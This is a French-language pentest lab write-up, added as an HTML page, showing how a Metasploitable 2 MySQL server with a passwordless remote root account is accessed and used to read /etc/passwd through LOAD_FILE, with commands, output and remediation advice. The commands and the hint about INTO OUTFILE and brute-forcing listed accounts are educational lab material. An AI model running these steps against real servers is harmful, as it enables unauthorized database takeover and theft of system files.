@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MySQL root sans mot de passe — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">MySQL 5.0.51a — root sans mot de passe</h1>
+    <h2 class="doc-subtitle">Identifiants par défaut + privilège FILE → lecture de fichiers arbitraires</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>MySQL — port <code class="mono">3306</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">Faiblesse</td><td>Compte <code>root</code> sans mot de passe, accessible à distance (<code>root@%</code>)</td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Contrôle total de la base</strong> + lecture arbitraire de fichiers (privilège FILE)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le serveur MySQL accepte le compte <code>root</code> <strong>sans mot de passe</strong>
+  depuis n'importe quelle machine (<code>root@%</code>), avec tous les privilèges. Ce n'est pas
+  une faille logicielle mais une <strong>configuration par défaut dangereuse</strong> : pas de
+  mot de passe administrateur, écoute ouverte sur le réseau. Le scan identifie la version.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms2-mysql/01-recon-nmap.png" alt="Scan nmap du port 3306">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc">Résultat de <code>nmap -sV -p 3306 192.168.56.101</code> : service
+      <code>MySQL 5.0.51a-3ubuntu5</code> exposé sur le réseau.</span>
+      <span class="fname">images/ms2-mysql/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Accès — identifiants par défaut</h2>
+  <p>Le client MySQL récent tente d'abord une connexion chiffrée (TLS) que ce serveur ancien ne
+  gère pas (<code>ERROR 2026 TLS/SSL error</code>) ; on la désactive avec
+  <code>--skip-ssl</code>. Le compte <code>root</code> se connecte alors <strong>sans mot de
+  passe</strong> :</p>
+
+  <pre class="terminal">$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
+VERSION()
+5.0.51a-3ubuntu5
+CURRENT_USER()
+root@%</pre>
+
+  <p><code>root@%</code> signifie que le compte administrateur est autorisé depuis
+  <strong>n'importe quelle adresse IP</strong>. Tenter <code>root:root</code> échoue
+  (« using password: YES ») : le mot de passe n'est pas « root », il est tout simplement
+  <strong>vide</strong>.</p>
+
+  <figure class="capture" id="cap-auth">
+    <img src="../images/ms2-mysql/02-auth-root.png" alt="Erreur SSL puis connexion root sans mot de passe">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">L'erreur TLS avec le client par défaut, puis la connexion réussie avec
+      <code>--skip-ssl</code> : <code>CURRENT_USER()</code> renvoie <code>root@%</code>.</span>
+      <span class="fname">images/ms2-mysql/02-auth-root.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation — privilège FILE</h2>
+  <p>On vérifie d'abord les privilèges du compte :</p>
+
+  <pre class="terminal">$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();"
+Grants for root@%
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION</pre>
+
+  <p><code>ALL PRIVILEGES</code> inclut le privilège <strong>FILE</strong>, qui autorise la
+  lecture (et l'écriture) de fichiers du système directement en SQL. On lit un fichier
+  arbitraire avec <code>LOAD_FILE</code> :</p>
+
+  <pre class="terminal">$ mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+...
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
+
+  <blockquote class="evidence">
+    Lecture du fichier <code>/etc/passwd</code> complet via SQL &mdash; liste de tous les
+    comptes système (msfadmin, user, service…), utile pour cibler ensuite un bruteforce
+    SSH/Telnet. Le privilège FILE autorise aussi l'écriture (<code>INTO OUTFILE</code>), voie
+    possible vers l'exécution de code.
+  </blockquote>
+
+  <figure class="capture" id="cap-privileges">
+    <img src="../images/ms2-mysql/03-privileges-file.png" alt="SHOW GRANTS montrant ALL PRIVILEGES">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc"><code>SHOW GRANTS</code> confirme <code>ALL PRIVILEGES ... WITH GRANT
+      OPTION</code> — le privilège FILE est inclus.</span>
+      <span class="fname">images/ms2-mysql/03-privileges-file.png</span>
+    </figcaption>
+  </figure>
+
+  <figure class="capture" id="cap-loadfile">
+    <img src="../images/ms2-mysql/04-load-file.png" alt="LOAD_FILE lisant /etc/passwd">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc"><code>LOAD_FILE('/etc/passwd')</code> renvoie le contenu du fichier :
+      preuve de la lecture arbitraire de fichiers via le privilège FILE.</span>
+      <span class="fname">images/ms2-mysql/04-load-file.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>Trois éléments établissent le contrôle total : connexion <code>root@%</code> sans mot de
+  passe, <code>ALL PRIVILEGES</code>, et lecture effective de <code>/etc/passwd</code> par
+  <code>LOAD_FILE</code>. L'attaquant dispose de la base entière et peut lire des fichiers du
+  système cible, sans aucun identifiant.</p>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Définir un mot de passe fort pour <code>root</code> et supprimer les comptes
+      anonymes/invités (<code>mysql_secure_installation</code>).</li>
+      <li>Restreindre <code>root</code> à <code>localhost</code> (supprimer <code>root@%</code>)
+      et n'exposer 3306 qu'aux hôtes applicatifs légitimes (pare-feu / bind-address).</li>
+      <li>Retirer le privilège <code>FILE</code> des comptes qui n'en ont pas besoin et
+      positionner <code>secure_file_priv</code> pour cloisonner les accès fichiers.</li>
+      <li>Mettre à jour vers une version MySQL/MariaDB maintenue (5.0 est obsolète).</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/mysql.md"><code>ms2/josa/mysql.md</code></a> (dépôt du labo)</li>
+    <li>Documentation du privilège FILE et de <code>LOAD_FILE</code> (MySQL).</li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — MySQL root sans mot de passe</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
